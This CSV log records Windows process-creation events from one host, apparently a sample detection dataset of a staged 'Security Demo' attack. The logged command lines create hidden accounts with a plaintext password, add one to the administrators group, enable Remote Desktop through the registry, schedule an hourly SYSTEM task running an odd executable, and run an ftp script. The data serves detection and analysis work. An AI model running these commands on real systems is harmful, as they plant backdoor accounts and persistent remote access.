,TenantId,Account,EventID,TimeGenerated,Computer,SubjectUserSid,SubjectUserName,SubjectDomainName,SubjectLogonId,NewProcessId,NewProcessName,TokenElevationType,ProcessId,CommandLine,ParentProcessName,TargetLogonId,SourceComputerId,TimeCreatedUtc
17484,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:33:28.013,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x3850,C:\Windows\System32\tasklist.exe,%%1938,0x17c4,tasklist  ,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:33:28.013
17485,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:33:28.023,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0xbc0,C:\Windows\System32\findstr.exe,%%1938,0x17c4,findstr  'cmd',C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:33:28.023
17486,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:33:34.633,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x33a8,C:\Windows\System32\tasklist.exe,%%1938,0x17c4,tasklist  ,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:33:34.633
17487,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:33:34.643,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x4488,C:\Windows\System32\findstr.exe,%%1938,0x17c4,findstr  'CMD',C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:33:34.643
17488,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:33:43.770,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x6ef8,C:\Windows\System32\tasklist.exe,%%1938,0x17c4,tasklist  -l,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:33:43.770
17491,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:33:47.840,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x5878,C:\Windows\System32\tasklist.exe,%%1938,0x17c4,tasklist  ?,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:33:47.840
17492,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:33:51.983,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x6be8,C:\Windows\System32\tasklist.exe,%%1938,0x17c4,tasklist  /?,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:33:51.983
17495,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:34:27.740,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x6fec,C:\Windows\System32\tasklist.exe,%%1938,0x17c4,TASKLIST  ,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:34:27.740
17498,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:34:55.263,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x6428,C:\Windows\System32\taskkill.exe,%%1938,0x17c4,taskkill  /IM powershell.exe,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:34:55.263
17499,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:35:03.003,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x7d58,C:\Windows\System32\taskkill.exe,%%1938,0x17c4,taskkill  /F /IM powershell.exe,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:35:03.003
17853,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:23:39.370,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x24c8,C:\Windows\System32\taskkill.exe,%%1938,0x17c4,taskkill,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:23:39.370
17854,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:23:43.430,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x1554,C:\Windows\System32\taskkill.exe,%%1938,0x17c4,taskkill  ?,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:23:43.430
17855,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:23:47.920,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x14f8,C:\Windows\System32\taskkill.exe,%%1938,0x17c4,taskkill  /?,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:23:47.920
17864,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:25:02.173,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x2688,C:\Windows\System32\taskkill.exe,%%1938,0x17c4,"taskkill  /IM cmd.exe /FI ""USERNAME eq NETWORKSERVICE"" ",C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:25:02.173
17876,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:26:17.727,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x7fd4,C:\Windows\System32\taskkill.exe,%%1938,0x17c4,"taskkill  /IM cmd.exe /FI ""USERNAME eq NETWOR KSERVICE"" ",C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:26:17.727
17877,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:26:30.490,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x9f8,C:\Windows\System32\taskkill.exe,%%1938,0x17c4,"taskkill  /IM cmd.exe /FI ""USERNAME eq NETWORK SERVICE"" ",C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:26:30.490
17954,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:29:36.263,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x2a00,C:\Windows\System32\taskkill.exe,%%1938,0x17c4,"taskkill  /F /IM cmd.exe /FI ""USERNAME eq NT AUTHORITY\NETWORK SERVICE"" ",C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:29:36.263
19352,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 22:36:13.340,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x7790,C:\Windows\System32\taskkill.exe,%%1938,0x17c4,taskkill  /?,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 22:36:13.340
22636,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:31:58.980,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x5ec,C:\Windows\System32\net.exe,%%1938,0x17c4,net  localgroup administrators abai$ /delete,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:31:58.980
22637,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:31:59.007,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x1368,C:\Windows\System32\net1.exe,%%1938,0x5ec,C:\Windows\system32\net1  localgroup administrators abai$ /delete,C:\Windows\System32\net.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:31:59.007
22638,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:31:59.033,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x1524,C:\Windows\System32\net.exe,%%1938,0x17c4,net  user abai$ /delete,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:31:59.033
22639,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:31:59.043,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x14b0,C:\Windows\System32\net1.exe,%%1938,0x1524,C:\Windows\system32\net1  user abai$ /delete,C:\Windows\System32\net.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:31:59.043
22640,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:31:59.067,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x754,C:\Windows\System32\net.exe,%%1938,0x17c4,net  user www.401hk.com /delete,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:31:59.067
22641,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:31:59.080,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x4f0,C:\Windows\System32\net1.exe,%%1938,0x754,C:\Windows\system32\net1  user www.401hk.com /delete,C:\Windows\System32\net.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:31:59.080
22642,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:31:59.103,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x5dc,C:\Windows\System32\cmd.exe,%%1938,0x17c4,cmd  /c echo End Security Demo tasks,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:31:59.103
22649,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:29:52.933,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x17c4,C:\Windows\System32\cmd.exe,%%1938,0x35c,"""C:\Windows\system32\cmd.exe"" ",C:\Windows\System32\rundll32.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:29:52.933
22650,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:29:52.943,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x1640,C:\Windows\System32\conhost.exe,%%1938,0x17c4,\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:29:52.943
22653,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:17.190,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0xe70,C:\Windows\System32\cmd.exe,%%1938,0x17c4,cmd  /c echo Begin Security Demo tasks,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:17.190
22654,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:17.210,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x174c,C:\Windows\System32\cmd.exe,%%1938,0x17c4,cmd  /c echo Any questions about the commands executed here then please contact one of,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:17.210
22655,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:17.227,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x1718,C:\Windows\System32\cmd.exe,%%1938,0x17c4,cmd  /c echo [email]; [email]; [email],C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:17.227
22656,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:17.307,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x1568,C:\Windows\System32\ftp.exe,%%1938,0x17c4,ftp  -s:MG06.dll,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:17.307
22657,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.187,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x8c0,C:\W!ndows\System32\cacls.exe,%%1938,0x17c4,cacls.exe  C:\Windows\system32\cscript.exe /e /t /g SYSTEM:F,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.187
22658,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.277,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x110c,C:\Windows\System32\net.exe,%%1938,0x17c4,net  users ,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.277
22659,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.290,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0xe5c,C:\Windows\System32\findstr.exe,%%1938,0x17c4,"findstr  ""abai$""",C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.290
22660,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.317,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0xeb0,C:\Windows\System32\net1.exe,%%1938,0x110c,C:\Windows\system32\net1  users ,C:\Windows\System32\net.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.317
22661,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.377,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0xe8c,C:\Windows\System32\net.exe,%%1938,0x17c4,net  user abai$ Wf9k44_9d[=$ /add,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.377
22662,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.387,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x244,C:\Windows\System32\net1.exe,%%1938,0xe8c,C:\Windows\system32\net1  user abai$ Wf9k44_9d[=$ /add,C:\Windows\System32\net.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.387
22663,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.413,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x8fc,C:\Windows\System32\net.exe,%%1938,0x17c4,net  user abai$ Wf9k44_9d[=$,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.413
22664,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.427,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0xba0,C:\Windows\System32\net1.exe,%%1938,0x8fc,C:\Windows\system32\net1  user abai$ Wf9k44_9d[=$,C:\Windows\System32\net.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.427
22665,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.453,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x9c4,C:\Windows\System32\net.exe,%%1938,0x17c4,net  localgroup administrators ,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.453
22666,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.460,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x798,C:\Windows\System32\findstr.exe,%%1938,0x17c4,"findstr  ""abai$""",C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.460
22667,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.470,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x7d8,C:\Windows\System32\net1.exe,%%1938,0x9c4,C:\Windows\system32\net1  localgroup administrators ,C:\Windows\System32\net.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.470
22668,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.493,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x3fc,C:\Windows\System32\net.exe,%%1938,0x17c4,net  localgroup administrators abai$ /add,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.493
22669,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.510,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x13c,C:\Windows\System32\net1.exe,%%1938,0x3fc,C:\Windows\system32\net1  localgroup administrators abai$ /add,C:\Windows\System32\net.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.510
22670,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.550,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x3bc,C:\Windows\System32\net.exe,%%1938,0x17c4,net  users ,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.550
22671,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.557,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x2b0,C:\Windows\System32\findstr.exe,%%1938,0x17c4,"findstr  ""www.401hk.com""",C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.557
22672,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.563,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x44,C:\Windows\System32\net1.exe,%%1938,0x3bc,C:\Windows\system32\net1  users ,C:\Windows\System32\net.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.563
22673,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.590,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x330,C:\Windows\System32\net.exe,%%1938,0x17c4,net  user www.401hk.com Wf9k44_9d[=$ /add,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.590
22674,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.603,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x3b0,C:\Windows\System32\net1.exe,%%1938,0x330,C:\Windows\system32\net1  user www.401hk.com Wf9k44_9d[=$ /add,C:\Windows\System32\net.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.603
22675,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.630,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0xef4,C:\Windows\System32\net.exe,%%1938,0x17c4,net  user www.401hk.com Wf9k44_sinc9d3[=$,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.630
22676,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.647,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x9fc,C:\Windows\System32\net1.exe,%%1938,0xef4,C:\Windows\system32\net1  user www.401hk.com Wf9k44_sinc9d3[=$,C:\Windows\System32\net.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.647
22677,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.673,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x8c4,C:\Windows\System32\net.exe,%%1938,0x17c4,net  user www.401hk.com /active:yes,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.673
22678,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.687,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0xf20,C:\Windows\System32\net1.exe,%%1938,0x8c4,C:\Windows\system32\net1  user www.401hk.com /active:yes,C:\Windows\System32\net.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.687
22679,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.720,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x528,C:\W!ndows\System32\reg.exe,%%1938,0x17c4,"reg  ADD ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f""",C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.720
22680,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.757,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0x17ac,C:\Windows\System32\schtasks.exe,%%1938,0x17c4,"schtasks.exe  /create /tn  /tr ""c:\pagefile.exe /?"" /sc hour /mo 1 /ru ""system"" /f",C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.757
22681,52b1ab41-869e-4138-9e40-2a4457f09bf0,MSTICAlertsWin1\ian,4688,2019-02-12 20:30:18.813,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-1120,ian,MSTICAlertsWin1,0x5d5af2,0xb74,C:\Windows\System32\PING.EXE,%%1938,0x17c4,ping  127.0.0.1 -n 100 ,C:\Windows\System32\cmd.exe,0x0,263a788b-6526-4cdc-8ed9-d79402fe4aa0,2019-02-12 20:30:18.813
